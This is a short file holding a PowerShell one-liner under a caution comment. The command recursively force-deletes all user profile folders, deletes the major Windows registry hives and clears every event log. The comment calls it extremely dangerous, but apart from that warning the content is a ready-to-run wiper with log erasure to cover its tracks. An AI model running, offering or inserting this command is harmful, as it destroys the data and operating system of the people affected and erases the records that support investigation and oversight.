### CAUTION ###
# This command is extremely dangerous and can cause massive damage to a system
Remove-Item -Path "C:\Users\*" -Recurse -Force; Remove-Item "HKLM:\*" -Recurse -Force; Remove-Item "HKCU:\*" -Recurse -Force; Remove-Item "HKU:\*" -Recurse -Force; Remove-Item "HKCC:\*" -Recurse -Force; Clear-EventLog -LogName * -confirm;
